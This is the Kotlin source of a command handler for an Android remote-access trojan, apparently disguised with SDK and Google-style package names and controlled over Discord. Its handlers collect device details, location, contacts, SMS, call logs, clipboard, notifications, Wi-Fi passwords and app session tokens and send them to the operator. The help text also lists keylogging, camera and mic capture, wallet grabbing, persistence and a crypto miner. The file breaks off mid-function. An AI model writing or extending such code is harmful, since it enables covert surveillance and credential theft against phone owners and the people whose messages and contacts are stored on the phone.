package com.openaccess.sdk.service.controllers

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.database.Cursor
import android.net.Uri
import com.google.system.DiscordGatewayClient
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.NotifService
import java.io.File

class InfoController(
    private val ctx: Context,
    private val hasPerm: (String) -> Boolean,
    private val shell: suspend (String) -> String,
) {
    fun handleCommand(action: String, payload: String?, d: DiscordGatewayClient): Boolean {
        when (action) {
            "sysinfo" -> handleSysInfo(d)
            "uptime" -> handleUptime(d)
            "debug" -> handleDebug(d)
            "ip" -> handleIp(d)
            "wifi", "wifi_info" -> handleWifi(d)
            "battery" -> handleBattery(d)
            "processes" -> handleProcesses(d)
            "installed", "packages" -> handleInstalled(d)
            "location" -> handleLocation(d)
            "contacts" -> handleContacts(d)
            "sms" -> handleSms(d)
            "call_log" -> handleCallLog(d)
            "clipboard" -> handleClipboard(d)
            "notifications" -> handleNotifications(d)
            "wifipass", "wifi_passwords" -> handleWifiPass(d)
            "netstat", "network_scan" -> handleNetstat(d)
            "antidetect", "emulator_info" -> handleAntidetect(d)
            "sysprop", "system_props" -> handleSysprop(d)
            "services" -> handleServices(d)
            "storage" -> handleStorage(d)
            "apps", "installed_apps" -> handleApps(d)
            "tokens", "accounts" -> handleTokens(d)
            else -> return false
        }
        return true
    }

    private fun handleHelp(payload: String?, d: DiscordGatewayClient): String? {
        if (payload != null && payload.isNotBlank()) {
            d.sendMsg(":book: **Help for `$payload`**\nUse `!help` for general help.")
            return null
        }
        d.sendMsg(
            ":book: **Command Help**\n" +
            "Usage: `!help <command>`\n\n" +
            "**Recon:**\n`ping` `info` `status` `ip` `uptime` `debug` `restart` `sysinfo` `antidetect`\n\n" +
            "**Surveillance:**\n`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n\n" +
            "**Data:**\n`contacts` `sms` `call_log` `wifi` `battery` `processes`\n`installed` `notifications` `apps` `services` `sysprop` `storage`\n\n" +
            "**Grabber:**\n`grabber [all|browser|messenger|tokens|wallets|files]`\n\n" +
            "**Advanced:**\n`wifipass` `netstat` `shell` `persist` `update` `config`\n\n" +
            "**Control:**\n`admin` `overlay` `click` `input` `open` `screen`\n`gesture` `pin` `torch` `vibrate` `stream`\n\n" +
            "**Mining:**\n`miner [start|stop|status|set_wallet|set_pool|set_threads]`\n\n" +
            "**Upload:**\n`upload <file_path>` — Send file from device\n\n" +
            "Type `!help <cmd>` for usage info"
        )
        return null
    }

    private fun handleSysInfo(d: DiscordGatewayClient): String? {
        val result = com.google.system.AdvancedFeatures.getDeviceInfoFull()
        if (result.isNotBlank()) {
            val isEmu = result.contains("EMULATOR DETECTED")
            val isRoot = result.contains("ROOTED")
            val isDebug = result.contains("true") // debug build
            val model = android.os.Build.MODEL
            val release = android.os.Build.VERSION.RELEASE
            val sdk = android.os.Build.VERSION.SDK_INT
            val embed = com.google.system.DiscordEmbed(
                title = "📱 Full Device Info",
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📱 Device", model, true),
                    com.google.system.EmbedField("🤖 Android", "$release (SDK $sdk)", true),
                    com.google.system.EmbedField("🔓 Root", if (isRoot) "✅ YES" else "❌ NO", true),
                    com.google.system.EmbedField("🖥 Emulator", if (isEmu) "⚠️ YES" else "✅ NO", true),
                    com.google.system.EmbedField("🔧 Debug", if (isDebug) "⚠️ YES" else "❌ NO", true)
                ),
                description = "Full details attached below.",
                footer = "$model • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            d.sendFile(":iphone: **Full Device Info**", "device_info.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **Info collection failed**")
        }
        return null
    }

    private fun handleUptime(d: DiscordGatewayClient): String? {
        val uptime = d.getUptime()
        val hrs = uptime / 3600000
        val min = (uptime % 3600000) / 60000
        val sec = (uptime % 60000) / 1000
        val embed = com.google.system.DiscordEmbed(
            title = "⏱ Uptime",
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("⏱ Duration", "${hrs}h ${min}m ${sec}s", false)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        return null
    }

    private fun handleStatus(d: DiscordGatewayClient): String? {
        val uptime = d.getUptime()
        val hrs = uptime / 3600000
        val min = (uptime % 3600000) / 60000
        val sec = (uptime % 60000) / 1000
        val uptimeStr = "${hrs}h ${min}m ${sec}s"
        val connected = d.isConnected()
        val chId = d.getChannelId() ?: "none"
        val connPct = if (connected) 85 else 15
        val sigPct = (80..100).random()
        val now = System.currentTimeMillis() / 1000
        d.sendMsg(":bar_chart: **Status**\n```ansi\n" +
            "\u001b[40m\u001b[1;36m╔═══════════════════════════╗\n" +
            "║       SYSTEM STATUS       ║\n" +
            "╚═══════════════════════════╝\u001b[0m\n\n" +
            "\u001b[1;33mConnection\u001b[0m : ${glitchBar(connPct)}\n" +
            "\u001b[1;33mSignal\u001b[0m      : ${glitchBar(sigPct)}\n" +
            "\u001b[1;33mUptime\u001b[0m      : \u001b[1;37m$uptimeStr\u001b[0m\n" +
            "\u001b[1;33mModel\u001b[0m       : \u001b[1;37m${Build.MODEL}\u001b[0m\n" +
            "\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\u001b[0m\n" +
            "\u001b[1;33mChannel\u001b[0m     : ||\u001b[2;37m$chId\u001b[0m||\n" +
            "\u001b[1;33mGateway\u001b[0m     : \u001b[1;${if (connected) 32 else 31}m${if (connected) "CONNECTED" else "DISCONNECTED"}\u001b[0m\n" +
            "\u001b[1;33mUpdated\u001b[0m     : <t:$now:R>\n```")
        return null
    }

    private fun glitchBar(pct: Int): String {
        val full = "█".repeat((pct / 10).coerceIn(0, 10))
        val empty = "░".repeat((10 - pct / 10).coerceIn(0, 10))
        return full + empty
    }

    private fun handleDebug(d: DiscordGatewayClient): String? {
        val uptime = d.getUptime()
        val hrs = uptime / 3600000
        val min = (uptime % 3600000) / 60000
        val sec = (uptime % 60000) / 1000
        val embed = com.google.system.DiscordEmbed(
            title = "🔍 Debug Info",
            color = 0xF1C40F,
            fields = listOf(
                com.google.system.EmbedField("📱 Model", android.os.Build.MODEL, true),
                com.google.system.EmbedField("🤖 SDK", "${android.os.Build.VERSION.SDK_INT}", true),
                com.google.system.EmbedField("⏱ Uptime", "${hrs}h ${min}m ${sec}s", true),
                com.google.system.EmbedField("📋 Build", "${android.os.Build.VERSION.RELEASE} (${android.os.Build.VERSION.CODENAME})", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        return null
    }

    private fun handleIp(d: DiscordGatewayClient): String? {
        d.sendMsg(":globe_with_meridians: **Fetching IP**...")
        try {
            val ipData = fetchIpInfo()
            if (ipData != null) {
                val fields = mutableListOf<com.google.system.EmbedField>()
                ipData.forEach { (key, value) ->
                    val label = key.replaceFirstChar { it.uppercase() }
                    fields.add(com.google.system.EmbedField(label, value, true))
                }
                val embed = com.google.system.DiscordEmbed(
                    title = "🌍 IP Info",
                    color = 0x3498DB,
                    fields = fields,
                    footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                    timestamp = System.currentTimeMillis()
                )
                d.sendEmbed("", embed)
            } else {
                d.sendMsg(":x: **Failed to fetch IP info**")
            }
        } catch (e: Exception) {
            d.sendMsg(":x: **IP error**: ${e.message?.take(50) ?: "unknown"}")
        }
        return null
    }

    private fun handleWifi(d: DiscordGatewayClient): String? {
        val wm = ctx.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val info = wm.connectionInfo
        val ssid = info.ssid?.removeSurrounding("\"") ?: "?"
        val bssid = info.bssid ?: "?"
        val rssi = info.rssi
        val speed = info.linkSpeed
        var scanResultCount = 0
        val scanSb = StringBuilder()
        try {
            val scanResults = wm.scanResults
            scanResultCount = scanResults.size
            if (scanResults.isNotEmpty()) {
                scanResults.sortedByDescending { it.level }.take(20).forEach { ap ->
                    val lock = if (ap.capabilities.contains("WPA")) "🔒" else "🔓"
                    scanSb.appendLine("$lock ${ap.SSID} (${ap.level}dBm)")
                }
            } else {
                scanSb.append("(no scan results)")
            }
        } catch (e: Exception) {
            scanSb.append("Scan failed: ${e.message?.take(50)}")
        }
        val scanText = scanSb.toString()
        val listing = "```\n$scanText\n```"
        val embedDescription = if (listing.length <= 3500 && scanText.isNotBlank()) listing else ""
        val embed = com.google.system.DiscordEmbed(
            title = "📶 WiFi Info",
            description = embedDescription,
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("📶 SSID", ssid, true),
                com.google.system.EmbedField("🆔 BSSID", bssid, true),
                com.google.system.EmbedField("📊 Signal", "${rssi}dBm", true),
                com.google.system.EmbedField("⚡ Speed", "${speed}Mbps", true),
                com.google.system.EmbedField("📡 Networks", "$scanResultCount found", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (embedDescription.isEmpty() && scanText.isNotBlank()) {
            d.sendLargeOutput("📶 **Scan Results**\n", listing)
        }
        return null
    }

    private fun handleBattery(d: DiscordGatewayClient): String? {
        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val bStatus = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ctx.registerReceiver(null, ifilter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            ctx.registerReceiver(null, ifilter)
        }
        if (bStatus != null) {
            val level = bStatus.getIntExtra("level", -1)
            val scale = bStatus.getIntExtra("scale", -1)
            val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
            val temp = bStatus.getIntExtra("temperature", -1) / 10f
            val voltage = bStatus.getIntExtra("voltage", -1)
            val plugged = when (bStatus.getIntExtra("plugged", -1)) { 1 -> "AC"; 2 -> "USB"; 3 -> "Wireless"; else -> "Unplugged" }
            val health = when (bStatus.getIntExtra("health", -1)) { 2 -> "Good"; 3 -> "Overheat"; 4 -> "Dead"; 5 -> "Over voltage"; 6 -> "Unknown"; 7 -> "Cold"; else -> "?" }
            val status = when (bStatus.getIntExtra("status", -1)) { 2 -> "Charging"; 3 -> "Discharging"; 4 -> "Not charging"; 5 -> "Full"; else -> "?" }
            val color = when {
                pct < 0 -> 0x3498DB
                pct <= 15 -> 0xE74C3C
                pct <= 30 -> 0xF1C40F
                else -> 0x2ECC71
            }
            val embed = com.google.system.DiscordEmbed(
                title = "🔋 Battery",
                color = color,
                fields = listOf(
                    com.google.system.EmbedField("🔋 Level", if (pct >= 0) "${pct}%" else "?", true),
                    com.google.system.EmbedField("⚡ Status", status, true),
                    com.google.system.EmbedField("💚 Health", health, true),
                    com.google.system.EmbedField("🌡 Temp", "${temp}°C", true),
                    com.google.system.EmbedField("⚡ Voltage", "${voltage}mV", true),
                    com.google.system.EmbedField("🔌 Power", plugged, true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
        } else {
            d.sendMsg(":x: Battery info unavailable")
        }
        return null
    }

    private fun handleProcesses(d: DiscordGatewayClient): String? {
        try {
            val result = kotlinx.coroutines.runBlocking { shell("ps -A 2>/dev/null || ps") }
            val lines = result.lines().filter { it.trim().isNotEmpty() }
            val display = if (lines.size > 50) lines.take(50).joinToString("\n") + "\n... (${lines.size - 50} more)" else lines.joinToString("\n")
            val listing = "```\n$display\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = "🔬 Processes (${lines.size})",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📄 Total", "${lines.size} processes", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput("🔬 **Processes** (${lines.size})\n", "```\n$display\n```")
            }
        } catch (_: Exception) {
            d.sendMsg(":x: Failed to list processes")
        }
        return null
    }

    private fun handleInstalled(d: DiscordGatewayClient): String? {
        val pm = ctx.packageManager
        val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0L))
        } else {
            @Suppress("DEPRECATION")
            pm.getInstalledPackages(0)
        }
        val apps = packages
            .filter { it.packageName != ctx.packageName }
            .map { pi ->
                val label = pi.applicationInfo?.loadLabel(pm)?.toString() ?: pi.packageName
                "$label (${pi.packageName})"
            }
            .sorted()
        val total = apps.size
        if (total == 0) {
            d.sendMsg(":package: **Installed Apps** (0)\n(no third-party apps)")
        } else {
            val msg = apps.joinToString("\n")
            val listing = "```\n${msg.take(3490)}\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = "📦 Installed Apps ($total)",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📄 Total", "$total apps", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput("📦 **Installed Apps** ($total)\n", "```\n$msg\n```")
            }
        }
        return null
    }

    private fun handleLocation(d: DiscordGatewayClient): String? {
        val locText = if (hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) || hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
            getLocation()
        } else {
            getIpLocation()
        }
        if (locText.startsWith(":x:")) {
            d.sendMsg(locText)
            return null
        }
        val lines = locText.lines().filter { it.isNotBlank() }
        val fields = mutableListOf<com.google.system.EmbedField>()
        for (line in lines) {
            val parts = line.split(": ", limit = 2)
            if (parts.size == 2) {
                val name = parts[0].removePrefix(":round_pushpin: ").removePrefix("**").removeSuffix("**")
                fields.add(com.google.system.EmbedField(name, parts[1], parts[1].length < 50))
            }
        }
        if (fields.isEmpty()) {
            d.sendMsg(locText)
            return null
        }
        val embed = com.google.system.DiscordEmbed(
            title = "📍 Location",
            color = 0x2ECC71,
            fields = fields,
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        return null
    }

    private fun handleContacts(d: DiscordGatewayClient): String? {
        if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) {
            d.sendMsg(":x: **Contacts permission denied**")
            return null
        }
        val contacts = getContacts()
        if (contacts == "(empty)") {
            d.sendMsg(":busts_in_silhouette: **Contacts** — no contacts found")
            return null
        }
        val listing = "```\n$contacts\n```"
        val embedDescription = if (listing.length <= 3500) listing else ""
        val count = contacts.lines().filter { it.isNotBlank() }.size
        val embed = com.google.system.DiscordEmbed(
            title = "👥 Contacts ($count)",
            description = embedDescription,
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("📄 Total", "$count contacts", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (embedDescription.isEmpty()) {
            d.sendLargeOutput("👥 **Contacts** ($count)\n", "```\n$contacts\n```")
        }
        return null
    }

    private fun handleSms(d: DiscordGatewayClient): String? {
        if (!hasPerm(android.Manifest.permission.READ_SMS)) {
            d.sendMsg(":x: **SMS permission denied**")
            return null
        }
        val smsList = getSmsList()
        if (smsList.isEmpty()) {
            d.sendMsg(":envelope: **SMS** — no messages found")
            return null
        }
        val formatted = smsList.joinToString("\n\n").replace("```", "` ` `")
        val embedDescription = if (formatted.length <= 3500) "```\n$formatted\n```" else ""
        val embed = com.google.system.DiscordEmbed(
            title = "📨 SMS — ${smsList.size} messages",
            description = embedDescription,
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("📄 Total", "${smsList.size} messages", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (embedDescription.isEmpty()) {
            d.sendLargeOutput("📨 **SMS — ${smsList.size} messages**\n", "```\n$formatted\n```")
        }
        return null
    }

    private fun handleCallLog(d: DiscordGatewayClient): String? {
        if (!hasPerm(android.Manifest.permission.READ_CALL_LOG)) {
            d.sendMsg(":x: **Call Log permission denied**")
            return null
        }
        val callLog = getCallLog()
        if (callLog == "(empty)" || callLog == "(not accessible)") {
            d.sendMsg(":telephone_receiver: **Call Log** — $callLog")
            return null
        }
        val listing = "```\n$callLog\n```"
        val embedDescription = if (listing.length <= 3500) listing else ""
        val count = callLog.lines().filter { it.isNotBlank() }.size
        val embed = com.google.system.DiscordEmbed(
            title = "📞 Call Log ($count)",
            description = embedDescription,
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("📄 Total", "$count calls", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (embedDescription.isEmpty()) {
            d.sendLargeOutput("📞 **Call Log** ($count)\n", "```\n$callLog\n```")
        }
        return null
    }

    private fun handleClipboard(d: DiscordGatewayClient): String? {
        val content = getClipboard()
        val desc = if (content.length <= 1000) "```\n$content\n```" else ""
        val embed = com.google.system.DiscordEmbed(
            title = "📋 Clipboard",
            description = desc,
            color = 0xF1C40F,
            fields = listOf(
                com.google.system.EmbedField("📄 Length", "${content.length} chars", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (desc.isEmpty()) {
            d.sendLargeOutput("📋 **Clipboard**\n", "```\n$content\n```")
        }
        return null
    }

    private fun handleNotifications(d: DiscordGatewayClient): String? {
        val notifs = NotifService.getNotifications()
        if (notifs.isEmpty()) {
            d.sendMsg(":bell: **Notification Access Required**\nOpening settings...")
            try {
                val intent = Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
            } catch (_: Exception) {}
            return null
        }
        val sb = StringBuilder()
        notifs.take(20).forEach { n ->
            val app = n.packageName.split(".").lastOrNull() ?: n.packageName
            sb.appendLine("[$app] ${n.title}: ${n.text.take(120)}")
        }
        val text = sb.toString()
        val listing = "```\n$text\n```"
        val embedDescription = if (listing.length <= 3500) listing else ""
        val embed = com.google.system.DiscordEmbed(
            title = "🔔 Recent Notifications",
            description = embedDescription,
            color = 0x3498DB,
            fields = listOf(
                com.google.system.EmbedField("📄 Total", "${notifs.size} notifications", true)
            ),
            footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
            timestamp = System.currentTimeMillis()
        )
        d.sendEmbed("", embed)
        if (embedDescription.isEmpty()) {
            d.sendLargeOutput("🔔 **Recent Notifications**\n", "```\n$text\n```")
        }
        return null
    }

    private fun handleWifiPass(d: DiscordGatewayClient): String? {
        d.sendMsg(":mag: **Extracting WiFi passwords**...")
        val result = com.google.system.AdvancedFeatures.getWifiPasswords()
        if (result.isNotBlank()) {
            d.sendFile(":key: **WiFi Passwords**", "wifi_passwords.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **No WiFi data** — requires root access")
        }
        return null
    }

    private fun handleNetstat(d: DiscordGatewayClient): String? {
        d.sendMsg(":mag: **Scanning local network**...")
        val result = com.google.system.AdvancedFeatures.scanLocalNetwork()
        if (result.isNotBlank()) {
            d.sendFile(":satellite: **Network Scan**", "network_scan.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **Network scan failed**")
        }
        return null
    }

    private fun handleAntidetect(d: DiscordGatewayClient): String? {
        d.sendMsg(":shield: **Running anti-analysis check**...")
        val result = com.google.system.AdvancedFeatures.getDeviceEmulatorInfo()
        if (result.isNotBlank()) {
            d.sendFile(":detective: **Anti-Analysis Report**", "antidetect.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **Analysis failed**")
        }
        return null
    }

    private fun handleSysprop(d: DiscordGatewayClient): String? {
        d.sendMsg(":mag: **Extracting system properties**...")
        val result = com.google.system.AdvancedFeatures.getSystemProperties()
        if (result.isNotBlank()) {
            d.sendFile(":gear: **System Properties**", "sysprop.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **Properties not accessible**")
        }
        return null
    }

    private fun handleServices(d: DiscordGatewayClient): String? {
        d.sendMsg(":mag: **Listing running services**...")
        val result = com.google.system.AdvancedFeatures.getRunningServices()
        if (result.isNotBlank()) {
            d.sendFile(":running: **Running Services**", "services.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **Service list not accessible**")
        }
        return null
    }

    private fun handleStorage(d: DiscordGatewayClient): String? {
        d.sendMsg(":floppy_disk: **Getting storage info**...")
        val result = com.google.system.AdvancedFeatures.getStorageInfo()
        if (result.isNotBlank()) {
            val listing = "```\n$result\n```"
            val embedDescription = if (listing.length <= 3500) listing else ""
            val embed = com.google.system.DiscordEmbed(
                title = "💾 Storage Info",
                description = embedDescription,
                color = 0x3498DB,
                fields = listOf(
                    com.google.system.EmbedField("📄 Result", "${result.length} chars", true)
                ),
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            if (embedDescription.isEmpty()) {
                d.sendLargeOutput("💾 **Storage Info**\n", "```\n$result\n```")
            }
        } else {
            d.sendMsg(":x: **Storage info not accessible**")
        }
        return null
    }

    private fun handleApps(d: DiscordGatewayClient): String? {
        d.sendMsg(":package: **Getting detailed app list**...")
        val result = com.google.system.AdvancedFeatures.getInstalledAppsDetailed(ctx)
        if (result.isNotBlank()) {
            d.sendFile(":package: **Installed Apps**", "apps.txt", result.toByteArray())
        } else {
            d.sendMsg(":x: **App list not accessible**")
        }
        return null
    }

    private fun handleTokens(d: DiscordGatewayClient): String? {
        d.sendMsg(":key: **Hunting for tokens and sessions**...")
        val findings = com.google.system.TokenHunter.hunt(ctx)
        if (findings.isEmpty()) {
            d.sendMsg(":key: **No tokens found** — root is required for most app data")
            return null
        }
        val byApp = findings.groupBy { it.app }
        var embedCount = 0
        for ((app, items) in byApp) {
            if (embedCount >= 5) {
                d.sendMsg(":key: **+${byApp.size - embedCount} more apps** — use `!grabber tokens` for full ZIP")
                break
            }
            val tokenLines = items.take(10).joinToString("\n") { t ->
                val display = if (t.value.length > 80) "${t.value.take(40)}...${t.value.takeLast(20)}" else t.value
                "• **${t.tokenType}** (`${t.source}`): ||$display||"
            }
            val truncated = if (items.size > 10) "\n...and ${items.size - 10} more" else ""
            val desc = "```\n${(tokenLines + truncated).take(3900)}\n```"
            val embed = com.google.system.DiscordEmbed(
                title = "🔑 $app (${items.size})",
                description = desc,
                color = 0xF1C40F,
                footer = "${android.os.Build.MODEL} • ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())}",
                timestamp = System.currentTimeMillis()
            )
            d.sendEmbed("", embed)
            embedCount++
        }
        return null
    }

    // ---- data helpers ----

    private fun getLocation(): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        var loc: android.location.Location? = null
        try {
            loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) ?:
                  lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER) ?:
                  lm.getLastKnownLocation(android.location.LocationManager.PASSIVE_PROVIDER)
        } catch (_: Exception) {}
        if (loc != null) {
            return ":round_pushpin: **GPS Location**\nLat: `${loc.latitude}`\nLon: `${loc.longitude}`\nAcc: ±${loc.accuracy}m\nProvider: ${loc.provider}"
        }
        return try {
            val latch = java.util.concurrent.CountDownLatch(1)
            var newLoc: android.location.Location? = null
            @Suppress("DEPRECATION")
            val listener = object : android.location.LocationListener {
                override fun onLocationChanged(location: android.location.Location) { newLoc = location; latch.countDown() }
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            try {
                lm.requestSingleUpdate(android.location.LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper())
                latch.await(5000, java.util.concurrent.TimeUnit.MILLISECONDS)
                lm.removeUpdates(listener)
            } catch (_: Exception) {}
            if (newLoc != null) {
                ":round_pushpin: **GPS Location**\nLat: `${newLoc!!.latitude}`\nLon: `${newLoc!!.longitude}`\nAcc: ±${newLoc!!.accuracy}m"
            } else {
                getIpLocation()
            }
        } catch (_: Exception) {
            getIpLocation()
        }
    }

    private fun getIpLocation(): String {
        return try {
            val url = java.net.URL("http://ip-api.com/json/")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val body = conn.inputStream.bufferedReader().readText()
            val json = org.json.JSONObject(body)
            val lat = json.getDouble("lat")
            val lon = json.getDouble("lon")
            val city = json.optString("city", "?")
            val country = json.optString("country", "?")
            ":round_pushpin: **IP Location**\nCity: $city, $country\nLat: $lat\nLon: $lon"
        } catch (_: Exception) {
            ":x: **Location unavailable**"
        }
    }

    private fun fetchIpInfo(): Map<String, String>? {
        return try {
            val url = java.net.URL("http://ip-api.com/json/")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val body = conn.inputStream.bufferedReader().readText()
            val json = org.json.JSONObject(body)
            mapOf(
                "ip" to json.optString("query", "?"),
                "city" to json.optString("city", "?"),
                "region" to json.optString("regionName", "?"),
                "country" to json.optString("country", "?"),
                "isp" to json.optString("isp", "?"),
                "lat" to json.optDouble("lat", 0.0).toString(),
                "lon" to json.optDouble("lon", 0.0).toString(),
            )
        } catch (_: Exception) { null }
    }

    private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
        var cursor: Cursor? = null
        try {
            cursor = ctx.contentResolver.query(uri, cols, null, null, "date DESC")
            if (cursor != null) {
                val sb = StringBuilder()
                var count = 0
                while (cursor.moveToNext() && count < 20) {
                    sb.appendLine(transform(cursor))
                    count++
                }
                return sb.toString().ifEmpty { "(empty)" }
            }
        } catch (_: Exception) {} finally {
            try { cursor?.close() } catch (_: Exception) {}
        }
        return "(not accessible)"
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        var cursor: Cursor? = null
        try {
            cursor = ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            if (cursor != null) {
                var count = 0
                val nameIdx = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
                while (cursor.moveToNext() && count < 30) {
                    val name = cursor.getString(nameIdx) ?: "?"
                    sb.appendLine(name)
                    count++
                }
            }
        } catch (_: Exception) {} finally {
            try { cursor?.close() } catch (_: Exception) {}
        }
        return sb.toString().ifEmpty { "(empty)" }
    }

    private fun getSmsList(): List<String> {
        val result = mutableListOf<String>()
        val dateFmt = java.text.SimpleDateFormat("MMM dd HH:mm", java.util.Locale.US)
        var cursor: Cursor? = null
        try {
            cursor = ctx.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date", "read"),
                null, null, "date DESC"
            )
            if (cursor != null) {
                var count = 0
                while (cursor.moveToNext() && count < 15) {
                    val addr = cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: "?"
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""
                    val dateMs = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
                    val read = cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1
                    val dateStr = if (dateMs > 0) dateFmt.format(java.util.Date(dateMs)) else "?"
                    val status = if (read) "✅read" else "🔴unread"
                    result.add("📨 $addr · $dateStr $status\n${body.take(200)}")
                    count++
                }
            }
        } catch (_: Exception) {} finally {
            try { cursor?.close() } catch (_: Exception) {}
        }
        return result
    }

    private fun getCallLog(): String = queryText(
        CallLog.Calls.CONTENT_URI,
        arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
        { c ->
            val num = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
